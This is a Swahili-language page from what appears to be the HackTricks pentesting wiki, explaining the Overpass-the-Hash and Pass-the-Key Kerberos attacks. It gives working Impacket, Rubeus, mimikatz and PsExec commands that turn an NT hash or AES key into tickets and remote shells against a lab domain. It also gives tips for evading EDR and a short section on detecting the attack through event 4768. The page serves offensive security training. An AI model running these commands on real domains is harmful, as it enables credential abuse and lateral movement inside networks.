# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

Shambulio la **Overpass The Hash/Pass The Key (PTK)** limeundwa kwa ajili ya mazingira ambako protocol ya kawaida ya NTLM imewekewa vizuizi, na authentication ya Kerberos inapewa kipaumbele. Shambulio hili hutumia NTLM hash au funguo za AES za mtumiaji kuomba tiketi za Kerberos, hivyo kuwezesha ufikiaji usioidhinishwa wa rasilimali ndani ya mtandao.

Kwa usahihi zaidi:

- **Over-Pass-the-Hash** kwa kawaida humaanisha kubadilisha **NT hash** kuwa Kerberos TGT kupitia ufunguo wa **RC4-HMAC** wa Kerberos.
- **Pass-the-Key** ni toleo la jumla zaidi ambapo tayari una ufunguo wa Kerberos kama vile **AES128/AES256**, kisha unaomba TGT moja kwa moja kwa kuutumia.

Tofauti hii ni muhimu katika mazingira yaliyoimarishwa kiusalama: ikiwa **RC4 imezimwa** au haitumiki tena kwa chaguo-msingi na KDC, **NT hash pekee haitoshi**, na unahitaji **AES key** (au password iliyo wazi ili kuipata).

Ili kutekeleza shambulio hili, hatua ya kwanza inahusisha kupata NTLM hash au password ya akaunti ya mtumiaji anayelengwa. Baada ya kupata taarifa hii, Ticket Granting Ticket (TGT) ya akaunti hiyo inaweza kupatikana, na kumruhusu mshambuliaji kufikia services au mashine ambazo mtumiaji huyo ana ruhusa za kuzifikia.

Mchakato unaweza kuanzishwa kwa commands zifuatazo:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Kwa hali zinazohitaji AES256, chaguo la `-aesKey [AES key]` linaweza kutumika:<sup>[[1]](#references)</sup>
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` pia inasaidia kuomba **service ticket moja kwa moja kupitia AS-REQ** kwa kutumia `-service <SPN>`, jambo ambalo linaweza kuwa muhimu unapotaka ticket ya SPN mahususi bila TGS-REQ ya ziada:
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
Zaidi ya hayo, ticket iliyopatikana inaweza kutumiwa pamoja na tools mbalimbali, zikiwemo `smbexec.py` au `wmiexec.py`, na hivyo kupanua wigo wa shambulio.

Matatizo kama vile _PyAsn1Error_ au _KDC cannot find the name_ kwa kawaida hutatuliwa kwa kusasisha library ya Impacket au kutumia hostname badala ya anwani ya IP, na hivyo kuhakikisha ulinganifu na Kerberos KDC.

Mfuatano mbadala wa amri unaotumia Rubeus.exe unaonyesha kipengele kingine cha technique hii:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Mbinu hii inaiga mtazamo wa **Pass the Key**, ikilenga kuchukua udhibiti wa ticket na kuitumia moja kwa moja kwa madhumuni ya authentication. Kwa vitendo:

- `Rubeus asktgt` hutuma **raw Kerberos AS-REQ/AS-REP** yenyewe na haihitaji ruhusa za admin isipokuwa ikiwa unataka kulenga logon session nyingine kwa kutumia `/luid` au kuunda session tofauti kwa `/createnetonly`.
- `mimikatz sekurlsa::pth` huweka credential material kwenye logon session na hivyo **hugusa LSASS**, jambo ambalo kwa kawaida huhitaji local admin au `SYSTEM` na huwa na kelele zaidi kwa mtazamo wa EDR.

Mifano kwa Mimikatz:
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
Ili kuzingatia usalama wa kiutendaji na kutumia AES256, amri ifuatayo inaweza kutumika:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` ni muhimu kwa sababu traffic inayozalishwa na Rubeus hutofautiana kidogo na Kerberos ya kawaida ya Windows. Pia kumbuka kuwa `/opsec` imekusudiwa kwa traffic ya **AES256**; kuitumia na RC4 kwa kawaida huhitaji `/force`, jambo ambalo hupunguza sehemu kubwa ya faida yake kwa sababu **RC4 katika domains za kisasa yenyewe ni signal thabiti**.

## Maelezo ya Detection

Kila ombi la TGT hutengeneza **event `4768`** kwenye DC. Katika builds za sasa za Windows, event hii ina fields muhimu zaidi kuliko zinavyotajwa kwenye writeups za zamani:

- `TicketEncryptionType` huonyesha enctype iliyotumika kwa TGT iliyotolewa. Thamani za kawaida ni `0x17` kwa **RC4-HMAC**, `0x11` kwa **AES128**, na `0x12` kwa **AES256**.<sup>[[3]](#references)</sup>
- Events zilizosasishwa pia huonyesha `SessionKeyEncryptionType`, `PreAuthEncryptionType`, na enctypes zilizotangazwa na client, jambo linalosaidia kutofautisha **utegemezi halisi wa RC4** na defaults za zamani zinazoweza kuchanganya.
- Kuona `0x17` katika mazingira ya kisasa ni dalili nzuri kwamba account, host, au KDC fallback path bado inaruhusu RC4, na hivyo ni rafiki zaidi kwa Over-Pass-the-Hash inayotegemea NT-hash.

Microsoft imekuwa ikipunguza hatua kwa hatua tabia ya kutumia RC4 kwa default tangu updates za Kerberos hardening za November 2022, na guidance iliyochapishwa sasa inapendekeza **kuondoa RC4 kama enctype inayodhaniwa kwa default kwa AD DCs ifikapo mwisho wa Q2 2026**. Kwa mtazamo wa offensive, hii inamaanisha kuwa **Pass-the-Key yenye AES** inazidi kuwa njia ya kuaminika, huku **NT-hash-only OpTH** ya kawaida ikiendelea kushindwa mara nyingi zaidi katika estates zilizofanyiwa hardening.<sup>[[3]](#references)</sup>

Kwa maelezo zaidi kuhusu aina za encryption za Kerberos na ticketing behaviour inayohusiana, angalia:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Toleo lenye stealth zaidi

> [!WARNING]
> Kila logon session inaweza kuwa na TGT moja tu iliyo active kwa wakati mmoja, kwa hivyo kuwa mwangalifu.

1. Unda logon session mpya kwa kutumia **`make_token`** kutoka Cobalt Strike.
2. Kisha, tumia Rubeus kutengeneza TGT kwa logon session mpya bila kuathiri iliyopo.

Unaweza kupata isolation inayofanana moja kwa moja kutoka Rubeus kwa kutumia sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
Hii huepuka kuandikwa upya kwa TGT ya session ya sasa na kwa kawaida ni salama zaidi kuliko kuingiza ticket katika session yako iliyopo ya logon.

## Marejeo

- [1] [Tarlogic - Kerberos (II): ¿Cómo atacar Kerberos?](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [2] [GhostPack - Rubeus (GitHub repository)](https://github.com/GhostPack/Rubeus)
- [3] [Microsoft Learn - Detect and Remediate RC4 Usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)

{{#include ../../banners/hacktricks-training.md}}
